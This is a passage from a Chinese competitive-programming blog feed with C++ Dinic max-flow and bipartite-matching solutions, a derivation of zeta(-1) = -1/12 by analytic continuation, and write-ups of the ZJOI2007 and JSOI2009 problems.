&#123;&#125;&#125;;int n, n1;inline void addEdge(int from, int to, int capacity) &#123; nodes[from].firstEdge = new Edge(&amp;nodes[from], &amp;nodes[to], capacity); nodes[to].firstEdge = new Edge(&amp;nodes[to], &amp;nodes[from], 0); nodes[from].firstEdge-&gt;reversedEdge = nodes[to].firstEdge, nodes[to].firstEdge-&gt;reversedEdge = nodes[from].firstEdge;&#125;struct Dinic &#123; bool makeLevelGraph(Node *s, Node *t) &#123; for (int i = 0; i &lt; n + 1; i++) nodes[i].level = 0; std::queue&lt;Node *&gt; q; q.push(s); s-&gt;level = 1; while (!q.empty()) &#123; Node *v = q.front(); q.pop(); for (Edge *e = v-&gt;firstEdge; e; e = e-&gt;next) &#123; if (e-&gt;flow &lt; e-&gt;capacity &amp;&amp; e-&gt;to-&gt;level == 0) &#123; e-&gt;to-&gt;level = v-&gt;level + 1; if (e-&gt;to == t) return true; else q.push(e-&gt;to); &#125; &#125; &#125; return false; &#125; int findPath(Node *s, Node *t, int limit = INT_MAX) &#123; if (s == t) return limit; for (Edge *e = s-&gt;firstEdge; e; e = e-&gt;next) &#123; if (e-&gt;to-&gt;level == s-&gt;level + 1 &amp;&amp; e-&gt;capacity &gt; e-&gt;flow) &#123; int flow = findPath(e-&gt;to, t, std::min(limit, e-&gt;capacity - e-&gt;flow)); if (flow &gt; 0) &#123; e-&gt;flow += flow; e-&gt;reversedEdge-&gt;flow -= flow; return flow; &#125; &#125; &#125; return 0; &#125; int operator()(int s, int t) &#123; int ans = 0; while (makeLevelGraph(&amp;nodes[s], &amp;nodes[t])) &#123; int flow; while ((flow = findPath(&amp;nodes[s], &amp;nodes[t])) &gt; 0) ans += flow; &#125; return ans; &#125;&#125; dinic;int main(int argc, char *const argv[]) &#123;#ifndef FILE freopen("flyer.in", "r", stdin); freopen("flyer.out", "w", stdout);#endif scanf("%d %d", &amp;n, &amp;n1); const int s = 0, t = n + 1; for (int i = 1; i &lt;= n1; i++) addEdge(s, i, 1); for (int i = n1 + 1; i &lt;= n; i++) addEdge(i, t, 1); while (!feof(stdin)) &#123; int u, v; scanf("%d %d", &amp;u, &amp;v); if (u &gt; v) std::swap(u, v); addEdge(u, v, 1); &#125; printf("%d\n", dinic(s, t));#ifndef FILE fclose(stdin); fclose(stdout);#endif return 0;&#125;参考资料一些好用的参考资料qwqDinic 学习笔记 | Menci's BlogDinic算法（研究总结，网络流）by SYCstdio最大流问题：增广路径算法的比较]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>网络流</tag>
        <tag>增广路</tag>
        <tag>最大流</tag>
        <tag>dinic</tag>
        <tag>图论</tag>
        <tag>费用流</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「玄学」为什么全体自然数的和为1/-12]]></title>
    <url>%2Farticles%2F%E8%87%AA%E7%84%B6%E6%95%B0%E7%9A%84%E5%92%8C%2F</url>
    <content type="text"><![CDATA[1+2+3+⋯=−1121+2+3+\cdots=-\frac{1}{12}1+2+3+⋯=−​12​​1​​阅读本文，你至少需要具备以下的数学水平：数学分析/高等数学、一些复数的基本知识（复变函数前三章即可）、知道Fourier级数、听说过Fourier变换、听说过 Γ\GammaΓ 函数与 ζ\zetaζ 函数1. Riemann ζ\zetaζ 函数我们知道，一个级数∑n=1∞an\sum_{n=1}^\infty a_n​n=1​∑​∞​​a​n​​的值，定义为部分和的极限limN→∞∑n=1Nan\lim_{N\rightarrow\infty}\sum_{n=1}^Na_n​N→∞​lim​​​n=1​∑​N​​a​n​​因此自然数的和∑n=1∞n=limN→∞∑n=1Nn=limN→∞N(N+1)2=+∞\sum_{n=1}^\infty n=\lim_{N\rightarrow\infty}\sum_{n=1}^Nn=\lim_{N\rightarrow\infty}\frac{N(N+1)}{2}=+\infty​n=1​∑​∞​​n=​N→∞​lim​​​n=1​∑​N​​n=​N→∞​lim​​​2​​N(N+1)​​=+∞是正无穷。所以∑n=1∞n=−112\sum_{n=1}^\infty n=-\frac{1}{12}​n=1​∑​∞​​n=−​12​​1​​是错的，本文完结骗你的数学上经常有这样的操作如果定义不够使用，就推广定义；如果推广以后仍然不能满足数学家的野心，那就修改定义；如果还不行，就抛弃这个定义。现在我们就抛弃级数考虑RiemannRiemannRiemann ζ\zetaζ 函数：ζ(z)=∑n=1∞1nz(Re(z)&gt;1)\zeta(z)=\sum_{n=1}^\infty\frac{1}{n^z}\quad(Re(z)&gt;1)ζ(z)=​n=1​∑​∞​​​n​z​​​​1​​(Re(z)&gt;1)设 z=x+iyz=x+iyz=x+iy ，若 x&gt;1x&gt;1x&gt;1 ，则∑n=1∞∣1nz∣≤∑n=1∞1nx&lt;+∞\sum_{n=1}^\infty\left|\frac{1}{n^z}\right|\leq\sum_{n=1}^\infty\frac{1}{n^x}&lt;+\infty​n=1​∑​∞​​​∣​∣​∣​∣​​​n​z​​​​1​​​∣​∣​∣​∣​​≤​n=1​∑​∞​​​n​x​​​​1​​&lt;+∞故 ζ(z)\zeta(z)ζ(z) 收敛。且 ζ(z)\zeta(z)ζ(z) 在 {z∈C:Re(z)&gt;1}\{z\in\mathbb{C}:Re(z)&gt;1\}{z∈C:Re(z)&gt;1} 的紧子集上一致收敛。原因：对于 {z∈C:Re(z)&gt;1}\{z\in\mathbb{C}:Re(z)&gt;1\}{z∈C:Re(z)&gt;1} 的紧子集 KKK ，存在 ε&gt;0\varepsilon&gt;0ε&gt;0 ，使得在 KKK 上恒有 Re(z)&gt;1+εRe(z)&gt;1+\varepsilonRe(z)&gt;1+ε ，从而在 KKK 上有控制级数∑n=1∞1n1+ε\sum_{n=1}^\infty\frac{1}{n^{1+\varepsilon}}​n=1​∑​∞​​​n​1+ε​​​​1​​用Weierstrass控制收敛定理进一步地， ζ(z)\zeta(z)ζ(z) 在 {z∈C:Re(z)&gt;1}\{z\in\mathbb{C}:Re(z)&gt;1\}{z∈C:Re(z)&gt;1} 上解析。我们想知道 ζ(−1)\zeta(-1)ζ(−1) 的值，因为按照定义:ζ(−1)∼∑n=1∞1n−1=∑n=1∞n\zeta(-1)\sim\sum_{n=1}^\infty\frac{1}{n^{-1}}=\sum_{n=1}^\infty nζ(−1)∼​n=1​∑​∞​​​n​−1​​​​1​​=​n=1​∑​∞​​n注意：这里及以后，用 === 表示真正的相等，用 ∼\sim∼ 表示“形式上的”相等目前， ζ\zetaζ 函数只对满足 Re(z)&gt;1Re(z)&gt;1Re(z)&gt;1 的复数 zzz 有定义， ζ(−1)\zeta(-1)ζ(−1) 是没有定义的。我们接下来的目标，就是用合理的方式，把 ζ\zetaζ 函数的定义扩展到整个复平面肯定不能再按照∑n=1∞1nz\sum_{n=1}^\infty\frac{1}{n^z}​n=1​∑​∞​​​n​z​​​​1​​定义，因为不收敛2. MellinMellinMellin 变换首先回顾一下 FourierFourierFourier 变换。设f:R→Cf:\mathbb{R}\rightarrow\mathbb{C}f:R→C是一个函数，定义Ff(x)=∫−∞+∞f(t)eixtdt\mathcal{F}f(x)=\int_{-\infty}^{+\infty}f(t)e^{ixt}dtFf(x)=∫​−∞​+∞​​f(t)e​ixt​​dt称Ff:R→C\mathcal{F}f:\mathbb{R}\rightarrow\mathbb{C}Ff:R→C为 fff 的 FourierFourierFourier 变换。MellinMellinMellin 变换和 FourierFourierFourier 变换类似，是一个积分变换它把一个正实数 R+\mathbb{R}^+R​+​​ 上的函数变换为一个 C\mathbb{C}C 上的函数设f:R+→Cf:\mathbb{R}^+\rightarrow\mathbb{C}f:R​+​​→C是一个函数，定义Mf(z)=∫0+∞f(s)szdss\mathcal{M}f(z)=\int_0^{+\infty}f(s)s^z\frac{ds}{s}Mf(z)=∫​0​+∞​​f(s)s​z​​​s​​ds​​称Mf:C→C\mathcal{M}f:\mathbb{C}\rightarrow\mathbb{C}Mf:C→C为 fff 的 MellinMellinMellin 变换为什么要这么定义呢？考虑复 FourierFourierFourier 变换（注意与之前的Fourier变换的区别和联系）F^f(z)=∫−∞+∞f(t)eztdx\hat{\mathcal{F}}f(z)=\int_{-\infty}^{+\infty}f(t)e^{zt}dx​F​^​​f(z)=∫​−∞​+∞​​f(t)e​zt​​dx它把一个函数f:R→Cf:\mathbb{R}\rightarrow\mathbb{C}f:R→C变换为F^f:C→C\hat{\mathcal{F}}f:\mathbb{C}\rightarrow\mathbb{C}​F​^​​f:C→C设 s=φ(t)=ets=\varphi(t)=e^ts=φ(t)=e​t​​ 是从加法群 R\mathbb{R}R 到乘法群 R+\mathbb{R}^+R​+​​ 的群同构，它把 R\mathbb{R}R 上的测度推到 R+\mathbb{R}^+R​+​​ 上（ dt=dssdt=\frac{ds}{s}dt=​s​​ds​​ ）注意下面的图表：我们可以计算因此F^(f∘φ)=Mf\hat{\mathcal{F}}(f\circ\varphi)=\mathcal{M}f​F​^​​(f∘φ)=Mf这样看来，MellinMellinMellin变换只不过是“ R+\mathbb{R}^+R​+​​ 上函数的 FourierFourierFourier 变换”而已。我们找几个函数，来算一算他们的Mellin变换把。1、fλ(s)=e−λsf_{\lambda}(s)=e^{-\lambda s}f​λ​​(s)=e​−λs​​取 λ=1\lambda=1λ=1 我们就得到了著名的 Γ\GammaΓ 函数。2、f(s)=∑n=1∞fπn2(s)=∑n=1∞e−πn2sf(s)=\sum_{n=1}^\infty f_{\pi n^2}(s)=\sum_{n=1}^\infty e^{-\pi n^2s}f(s)=​n=1​∑​∞​​f​πn​2​​​​(s)=​n=1​∑​∞​​e​−πn​2​​s​​这里牵扯到收敛性的问题。对于第二个 ∼\sim∼ ，只要 Re(z)&gt;12Re(z)&gt;\frac{1}{2}Re(z)&gt;​2​​1​​ 就能变成 === 。对于第一个 ∼\sim∼ ，考虑这里的积分与极限实际上是可交换的,原因：假设 Re(z)=x&gt;12Re(z)=x&gt;\frac{1}{2}Re(z)=x&gt;​2​​1​​ ，那么∫0+∞∣∑n=1Ne−πn2ssz−1∣ds≤∫0+∞∑n=1Ne−πn2ssx−1ds\int_0^{+\infty}\left|\sum_{n=1}^Ne^{-\pi n^2s}s^{z-1}\right|ds\leq\int_0^{+\infty}\sum_{n=1}^Ne^{-\pi n^2s}s^{x-1}ds∫​0​+∞​​​∣​∣​∣​∣​∣​​​n=1​∑​N​​e​−πn​2​​s​​s​z−1​​​∣​∣​∣​∣​∣​​ds≤∫​0​+∞​​​n=1​∑​N​​e​−πn​2​​s​​s​x−1​​ds而故∫0+∞∑n=1Ne−πn2ssx−1ds≤∫01∑n=1Ne−πn2ssx−1ds+C∫1+∞sx−1−12ds&lt;+∞\int_0^{+\infty}\sum_{n=1}^Ne^{-\pi n^2s}s^{x-1}ds\leq\int_0^1\sum_{n=1}^Ne^{-\pi n^2s}s^{x-1}ds+C\int_1^{+\infty}s^{x-1-\frac{1}{2}}ds&lt;+\infty∫​0​+∞​​​n=1​∑​N​​e​−πn​2​​s​​s​x−1​​ds≤∫​0​1​​​n=1​∑​N​​e​−πn​2​​s​​s​x−1​​ds+C∫​1​+∞​​s​x−1−​2​​1​​​​ds&lt;+∞控制收敛这样我们就得到了这部分的最重要的等式，也是我们需要用到的结论：π−zζ(2z)Γ(z)=∫0+∞(∑n=1∞e−πn2s)sz−1dsRe(z)&gt;12\pi^{-z}\zeta(2z)\Gamma(z)=\int_0^{+\infty}\left(\sum_{n=1}^\infty e^{-\pi n^2s}\right)s^{z-1}ds\;\;\;\;Re(z)&gt;\frac{1}{2}π​−z​​ζ(2z)Γ(z)=∫​0​+∞​​(​n=1​∑​∞​​e​−πn​2​​s​​)s​z−1​​dsRe(z)&gt;​2​​1​​3. PoissonPoissonPoisson求和公式再来看一下FourierFourierFourier变换Ff(x)=∫−∞+∞f(t)eixtdt\mathcal{F}f(x)=\int_{-\infty}^{+\infty}f(t)e^{ixt}dtFf(x)=∫​−∞​+∞​​f(t)e​ixt​​dt对于足够“好”的函数 f ，可以证明 PoissonPoissonPoisson 求和公式∑n∈Zf(n)=∑n∈ZFf(n)\sum_{n\in\mathbb{Z}}f(n)=\sum_{n\in\mathbb{Z}}\mathcal{F}f(n)​n∈Z​∑​​f(n)=​n∈Z​∑​​Ff(n)这部分我们就证明这个公式假设 fff 足够“好”（要多好有多好），定义F(t)=∑n∈Zf(n+t)F(t)=\sum_{n\in\mathbb{Z}}f(n+t)F(t)=​n∈Z​∑​​f(n+t)则 FFF 是 R\mathbb{R}R 上周期为 111 的函数，于是可以构造 FFF 的 FourierFourierFourier 级数：令ck=∫01F(t)e−2πiktdtc_k=\int_0^1F(t)e^{-2\pi ikt}dtc​k​​=∫​0​1​​F(t)e​−2πikt​​dt是第 kkk 个 FourierFourierFourier 系数，则F(t)∼∑k∈Zcke2πiktF(t)\sim\sum_{k\in\mathbb{Z}}c_ke^{2\pi ikt}F(t)∼​k∈Z​∑​​c​k​​e​2πikt​​而这个系数从而∑n∈Zf(n)=F(0)∼∑k∈Zck=∑k∈ZFf(k)\sum_{n\in\mathbb{Z}}f(n)=F(0)\sim\sum_{k\in\mathbb{Z}}c_k=\sum_{k\in\mathbb{Z}}\mathcal{F}f(k)​n∈Z​∑​​f(n)=F(0)∼​k∈Z​∑​​c​k​​=​k∈Z​∑​​Ff(k)就得到了 PoissonPoissonPoisson 求和公式形式上的“证明”那么 fff 究竟要满足什么条件呢？如果周期函数 F∈C2[0,1]F\in C^2[0,1]F∈C​2​​[0,1] ，就有F(t)=∑k∈Zcke2πiktF(t)=\sum_{k\in\mathbb{Z}}c_ke^{2\pi ikt}F(t)=​k∈Z​∑​​c​k​​e​2πikt​​因此，我们要求 fff 二阶连续可导，并且∑n∈Z∣∣f∣∣[n.n+1],∞+∣∣f′∣∣[n.n+1],∞+∣∣f′′∣∣[n.n+1],∞&lt;+∞\sum_{n\in\mathbb{Z}}||f||_{[n.n+1],\infty}+||f'||_{[n.n+1],\infty}+||f''||_{[n.n+1],\infty}&lt;+\infty​n∈Z​∑​​∣∣f∣∣​[n.n+1],∞​​+∣∣f​′​​∣∣​[n.n+1],∞​​+∣∣f​′′​​∣∣​[n.n+1],∞​​&lt;+∞使用导数一致收敛的判别法则，就得到 F∈C2[0,1]F\in C^2[0,1]F∈C​2​​[0,1] 啦qwq也就是说，如果 f∈C2(R)f\in C^2(\mathbb{R})f∈C​2​​(R) ，并且∑n∈Z∣∣f∣∣[n.n+1],∞+∣∣f′∣∣[n.n+1],∞+∣∣f′′∣∣[n.n+1],∞&lt;+∞\sum_{n\in\mathbb{Z}}||f||_{[n.n+1],\infty}+||f'||_{[n.n+1],\infty}+||f''||_{[n.n+1],\infty}&lt;+\infty​n∈Z​∑​​∣∣f∣∣​[n.n+1],∞​​+∣∣f​′​​∣∣​[n.n+1],∞​​+∣∣f​′′​​∣∣​[n.n+1],∞​​&lt;+∞就有 PoissonPoissonPoisson 求和公式∑n∈Zf(n)=∑n∈ZFf(n)\sum_{n\in\mathbb{Z}}f(n)=\sum_{n\in\mathbb{Z}}\mathcal{F}f(n)​n∈Z​∑​​f(n)=​n∈Z​∑​​Ff(n)4. End前面已经做了充分的准备工作，是时候向目标发起最后冲刺了。设 λ&gt;0\lambda&gt;0λ&gt;0 ，令θ(λ)=∑n∈Ze−πn2λψ(λ)=∑n=1∞e−πn2λ\theta(\lambda)=\sum_{n\in\mathbb{Z}}e^{-\pi n^2\lambda} \psi(\lambda)=\sum_{n=1}^\infty e^{-\pi n^2\lambda}θ(λ)=​n∈Z​∑​​e​−πn​2​​λ​​ψ(λ)=​n=1​∑​∞​​e​−πn​2​​λ​​很显然θ(λ)=2ψ(λ)+1\theta(\lambda)=2\psi(\lambda)+1θ(λ)=2ψ(λ)+1考虑 f(t)=e−πt2λf(t)=e^{-\pi t^2\lambda}f(t)=e​−πt​2​​λ​​，计算得Ff(x)=1λe−πx2λ\mathcal{F}f(x)=\frac{1}{\sqrt{\lambda}}e^{-\pi\frac{x^2}{\lambda}}Ff(x)=​√​λ​​​​​1​​e​−π​λ​​x​2​​​​​​而且满足相应条件，因此用 PoissonPoissonPoisson 求和公式∑n∈Ze−πn2λ=1λ∑n∈Ze−πn2λ\sum_{n\in\mathbb{Z}}e^{-\pi n^2\lambda}=\frac{1}{\sqrt{\lambda}}\sum_{n\in\mathbb{Z}}e^{-\pi\frac{n^2}{\lambda}}​n∈Z​∑​​e​−πn​2​​λ​​=​√​λ​​​​​1​​​n∈Z​∑​​e​−π​λ​​n​2​​​​​​即θ(λ)=1λθ(1λ)\theta(\lambda)=\frac{1}{\sqrt{\lambda}}\theta\left(\frac{1}{\lambda}\right)θ(λ)=​√​λ​​​​​1​​θ(​λ​​1​​)换成 ψ\psiψ 就是ψ(1λ)=λψ(λ)+λ−12\psi\left(\frac{1}{\lambda}\right)=\sqrt{\lambda}\psi(\lambda)+\frac{\sqrt{\lambda}-1}{2}ψ(​λ​​1​​)=√​λ​​​ψ(λ)+​2​​√​λ​​​−1​​第二部分的最后，得到了以上计算的前提是 Re(z)&gt;12Re(z)&gt;\frac{1}{2}Re(z)&gt;​2​​1​​令 w=2zw=2zw=2z ，则当 Re(w)&gt;1Re(w)&gt;1Re(w)&gt;1 时π−wζ(w)Γ(w2)=∫1+∞ψ(s)(sw−2+s−w−1)ds−1w(1−w)\sqrt{\pi}^{-w}\zeta(w)\Gamma\left(\frac{w}{2}\right)=\int_1^{+\infty}\psi(s)(\sqrt{s}^{w-2}+\sqrt{s}^{-w-1})ds-\frac{1}{w(1-w)}√​π​​​​−w​​ζ(w)Γ(​2​​w​​)=∫​1​+∞​​ψ(s)(√​s​​​​w−2​​+√​s​​​​−w−1​​)ds−​w(1−w)​​1​​现在观察：等号右边是一个亚纯函数（亚纯函数就是“能表示成两个解析函数的商 ”的函数，或者“没有本性奇点”的函数，两个亚纯函数经过四则运算仍然是亚纯函数），而等号左边的 π−w\sqrt{\pi}^{-w}√​π​​​​−w​​ 、 Γ(w2)\Gamma\left(\frac{w}{2}\right)Γ(​2​​w​​) 也都是亚纯函数。这样，上式相当于给出了 ζ(w)\zeta(w)ζ(w) 在 w∈Cw\in\mathbb{C}w∈C 上的定义！这还没完，试试在等号右边把 w 换为 1-w ，你会发现式子根本没变。这就说明：π−wζ(w)Γ(w2)=πw−1ζ(1−w)Γ(1−w2)\sqrt{\pi}^{-w}\zeta(w)\Gamma\left(\frac{w}{2}\right)=\sqrt{\pi}^{w-1}\zeta(1-w)\Gamma\left(\frac{1-w}{2}\right)√​π​​​​−w​​ζ(w)Γ(​2​​w​​)=√​π​​​​w−1​​ζ(1−w)Γ(​2​​1−w​​)现在让 w=−1w=-1w=−1 ，就有πζ(−1)Γ(−12)=π−2ζ(2)Γ(1)\sqrt{\pi}\zeta(-1)\Gamma\left(-\frac{1}{2}\right)=\sqrt{\pi}^{-2}\zeta(2)\Gamma(1)√​π​​​ζ(−1)Γ(−​2​​1​​)=√​π​​​​−2​​ζ(2)Γ(1)我们知道，，，因此：ζ(−1)=π−2ζ(2)Γ(1)πΓ(−12)=π26π3(−2)π=−112\zeta(-1)=\frac{\sqrt{\pi}^{-2}\zeta(2)\Gamma(1)}{\sqrt{\pi}\Gamma\left(-\frac{1}{2}\right)}=\frac{\frac{\pi^2}{6}}{\sqrt{\pi}^3(-2)\sqrt{\pi}}=-\frac{1}{12}ζ(−1)=​√​π​​​Γ(−​2​​1​​)​​√​π​​​​−2​​ζ(2)Γ(1)​​=​√​π​​​​3​​(−2)√​π​​​​​​6​​π​2​​​​​​=−​12​​1​​证明完结#\##]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>毒瘤</tag>
        <tag>玄学</tag>
        <tag>瞎搞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「二分图最大匹配」网络流做法]]></title>
    <url>%2Farticles%2F%E7%BD%91%E7%BB%9C%E6%B5%81-%E4%BA%8C%E5%88%86%E5%9B%BE%E6%9C%80%E5%A4%A7%E5%8C%B9%E9%85%8D%2F</url>
    <content type="text"><![CDATA[前几篇介绍了匈牙利算法求二分图最大匹配那么本文就介绍一下dinic求最大匹配吧qwq（其实所有可以使用二分图做的题目基本都可以使用网络流题目描述给定一个二分图，结点个数分别为n,m，边数为e，求二分图最大匹配数输入输出格式输入格式第一行，n,m,en,m,en,m,e第二至 e+1e+1e+1 行，每行两个正整数 u,vu,vu,v ，表示 u,vu,vu,v 有一条连边输出格式共一行，二分图最大匹配网络流解法建一个点 SSS 编号为 111 为源点，建一个点 TTT 编号为 n+m+2n+m+2n+m+2 为汇点。然后让 AAA 类点分别编号为 2→n+12\to n+12→n+1 , BBB 类点分别编号为 n+2→n+m+1n+2\to n+m+1n+2→n+m+1然后建边：把 SSS 和所有 AAA 类点都连边，ABABAB 类点之间根据输入连边，所有 BBB 类点和 TTT 连边，每条边边权均为 111然后我们用网络最大流跑一下，最终汇入汇点的流量其实就是二分图的最大匹配可是为什么能这样做呢qwq我们仔细分析一下,我简单画一个图：中间是二分图，（边权懒得画了qwq因为每一次有流量汇入就代表二分图成功匹配啦qwqAC Code:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;#include &lt;queue&gt;const int MAXN = 2000 + 5;const int MAXM = 1002000 + 5;const int INF = 0x3f3f3f;struct Edge &#123; int to, dist; int next, pre;&#125; edges[MAXM &lt;&lt; 1];int head[MAXN];int deep[MAXN];int tot, n, S, T;int left, right, edg;inline int min (const int &amp;a, const int &amp;b) &#123; return a &gt; b ? b : a;&#125;bool bfs () &#123; std::queue &lt;int&gt; qwq; memset (deep, 0, sizeof(deep)); qwq.push(S); deep[S] = 1; while (!qwq.empty()) &#123; int top = qwq.front(); qwq.pop(); for (int i = head[top]; i; i = edges[i].next) &#123; if (edges[i].dist &gt; 0 &amp;&amp; !deep[edges[i].to]) &#123; deep[edges[i].to] = deep[top] + 1; qwq.push(edges[i].to); &#125; &#125; &#125; return deep[T];&#125;int dfs (int pos, int cur) &#123; if (pos == T) return cur; int ccc = cur; for (int i = head[pos]; i; i = edges[i].next) &#123; if (deep[edges[i].to] == deep[pos] + 1 &amp;&amp; edges[i].dist &amp;&amp; ccc) &#123; int flow = dfs (edges[i].to, min(edges[i].dist, ccc)); if (flow &gt; 0) &#123; edges[i].dist -= flow; ccc -= flow; edges[ edges[i].pre ].dist += flow; &#125; &#125; &#125; return cur - ccc;&#125;int dinic () &#123; int ans = 0; while (bfs()) ans += dfs (S, INF); return ans;&#125;void addedge (int from, int to, int dist, int pre) &#123; edges[++tot].to = to; edges[tot].dist = dist; edges[tot].pre = pre; edges[tot].next = head[from]; head[from] = tot;&#125;inline int SlowRead()&#123; char ch = 0; int data = 0, w = 1; while (ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getchar(); if(ch == '-') w = -1, ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') data = (data &lt;&lt; 1) + (data &lt;&lt; 3) + ch - '0', ch = getchar(); return data * w;&#125;int main(int argc, char const *argv[]) &#123; left = SlowRead(); right = SlowRead(); edg = SlowRead(); n = left + right + 2; for (int i = 1; i &lt;= edg; i++) &#123; int from = SlowRead(), to = SlowRead(); if (from &lt;= left &amp;&amp; to &lt;= right) &#123; addedge (from + 1, to + left + 1, 1, tot + 2); addedge (to + left + 1, from + 1, 0, tot + 0); &#125; &#125; for(int i = 1; i &lt;= left; i++) &#123; addedge (1, i + 1, 1, tot + 2); addedge (i + 1, 1, 0, tot + 0); &#125; for(int i = 1; i &lt;= right; i++) &#123; addedge (i + left + 1, n, 1, tot + 2); addedge (n, i + left + 1, 0, tot + 0); &#125; S = 1; T = n; printf ("%d", dinic()); return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>二分图</tag>
        <tag>网络流</tag>
        <tag>二分图最大匹配</tag>
        <tag>增广路</tag>
        <tag>最大流</tag>
        <tag>dinic</tag>
        <tag>图论</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「ZJOI2007」矩阵游戏 - 二分图最大匹配 + 染色]]></title>
    <url>%2Farticles%2FZJOI2007-%E7%9F%A9%E9%98%B5%E6%B8%B8%E6%88%8F%2F</url>
    <content type="text"><![CDATA[又双叒叕是一道二分图题目描述小 QQQ 是一个非常聪明的孩子，除了国际象棋，他还很喜欢玩一个电脑益智游戏――矩阵游戏。矩阵游戏在一个 N×NN \times NN×N 黑白方阵进行（如同国际象棋一般，只是颜色是随意的）。每次可以对该矩阵进行两种操作：行交换操作 - 选择矩阵的任意两行，交换这两行（即交换对应格子的颜色）列交换操作 - 选择矩阵的任意两列，交换这两列（即交换对应格子的颜色）游戏的目标，即通过若干次操作，使得方阵的主对角线(左上角到右下角的连线)上的格子均为黑色对于某些关卡，小 QQQ 百思不得其解，以致他开始怀疑这些关卡是不是根本就是无解的！于是小 QQQ 决定写一个程序来判断这些关卡是否有解输入输出格式输入格式第一行包含一个整数 TTT ，表示数据的组数。接下来包含 TTT 组数据，每组数据第一行为一个整数 NNN ，表示方阵的大小；接下来 NNN 行为一个 N×NN \times NN×N 的 010101 矩阵（ 000 表示白色， 111 表示黑色）。输出格式： 包含 TTT 行。对于每一组数据，如果该关卡有解，输出一行 YesYesYes ；否则输出一行 NoNoNo输入输出样例输入样例12345678220 00 130 0 10 1 01 0 0输出样例12NoYes说明对于 20%20\%20% 的数据，n≤7n\le 7n≤7对于 50%50\%50% 的数据， N≤50N \le 50N≤50对于 100%100\%100% 的数据， N≤200N \le 200N≤200题解题目很水，但是一开始让人很绝望qwq其实我们很显然的就可以找到一个建图方法:对，按照横坐标 &amp;&amp; 纵坐标建立二分图经过一系列操作后，图就变成了o --------- o o --------- o o --------- o（Deepin 卡了qwq，没法再用 GeoGebra 了qwq所以说只要它是一个有完全匹配的图，就明显可以...真-裸二分图匹配毕竟是裸的二分图匹配，就不放代码了qwqEND]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>二分图</tag>
        <tag>网络流</tag>
        <tag>二分图最大匹配</tag>
        <tag>染色</tag>
        <tag>增广路</tag>
        <tag>图论</tag>
        <tag>匈牙利算法</tag>
        <tag>ZJOI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「JSOI2009」游戏 - 染色 + 二分图最大匹配]]></title>
    <url>%2Farticles%2FJSOI2009-%E6%B8%B8%E6%88%8F%2F</url>
    <content type="text"><![CDATA[今天学二分图.....于是我们看到了这样的题：JSOI2009-游戏，于是我们打开算法标签，发现这是网络流的题目....然而我们仔细分析题目，发现就是二分图板子题qwq题目描述小 AAAAAA 和小 YYYYYY 得到了《喜羊羊和灰太狼》的电影票，都很想去观看，但是电影票只有一张，于是他们用智力游戏决定胜负，赢得游戏的人可以获得电影票。在 N×MN\times MN×M 的迷宫中有一个棋子，小 AAAAAA 首先任意选择棋子放置的位置。然后，小 YYYYYY 和小 AAAAAA 轮流将棋子移动到相邻的格子里。游戏的规则规定，在一次游戏中，同一个格子不能进入两次，且不能将棋子移动到某些格子中去。当玩家无法继续移动棋子时，游戏结束，最后一个移动棋子的玩家赢得了游戏。例如下图所示的迷宫，迷宫中.表示棋子可以经过的格子，而#表示棋子不可以经过的格子：123.##...#.#若小 AAAAAA 将棋子放置在 (1,1)(1,1)(1,1) ，则小 AAAAAA 则无论如何都无法赢得游戏。而若小 AAAAAA 将棋子放置在 (3,2)(3,2)(3,2) 或 (2,3)(2,3)(2,3) ，则小 AAAAAA 能够赢得游戏。例如，小 AAAAAA 将棋子放置在 (3,2)(3,2)(3,2) ，小 YYYYYY 只能将它移动到 (2,2)(2,2)(2,2) ，此时小 AAAAAA 再将棋子移动到 (2,3)(2,3)(2,3) ，就赢得了游戏。小 AAAAAA 和小 YYYYYY 都是绝顶聪明的小朋友，且从不失误。小 AAAAAA 到底能不能赢得这场游戏，从而得到珍贵的电影票呢？输入输出格式输入格式输入数据首先输入两个整数 N,MN,MN,M，表示了迷宫的边长。接下来 NNN 行，每行 MMM 个字符，描述了迷宫。输出格式若小 AAAAAA 能够赢得游戏，则输出一行WIN，然后输出所有可以赢得游戏的起始位置，按行优先顺序输出，每行一个否则输出一行LOSE输入输出样例输入样例12343 3.##...#.#输出样例123WIN2 33 2说明对30%30\%30%的数据，有 1≤n,m≤51\le n,m\le 51≤n,m≤5对100%100\%100%的数据，有 1≤n,m≤1001\le n,m\le 1001≤n,m≤100题解首先，我们看一下样例:12343 3.##...#.#我们抽象出来，#的点就忽略染色，这就是一个二分图了qwq我们可以显而易见地找到他的二分图最大劈配匹配:我们思考放置先手旗子的最佳位置:假如这个图是有完全匹配，那么对于先手放的任意一步棋，后手都可以走匹配边，先手只能被迫选择另外一个匹配点，而后手又可以找到一条匹配边 ⋯\cdots⋯，无限循环直到点都被走过或者找不到可以走的边了qwq所以只要是有完美匹配，后手必赢然而对于不是完全匹配的二分图，就比较难搞了qwq回顾我们的思考过程，我们发现只要某一方第一步放在匹配点上，就会陷入被动直到GG，于是，先手只能放非匹配点注意到 非匹配点到达的点都是匹配点，于是后手必定会走到匹配点，后手就GG所以说此时先手可以下所有非匹配点，所有非匹配点就是答案！123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#define DEBUG(x) std::cerr &lt;&lt; #x &lt;&lt; " = " &lt;&lt; x &lt;&lt; std::endlconst int MAXN = 100 + 7;const int MAXM = 100 + 7;int n, m;int f[MAXN][MAXM], co[MAXN * MAXM];bool ans[MAXN * MAXM], vis[MAXN * 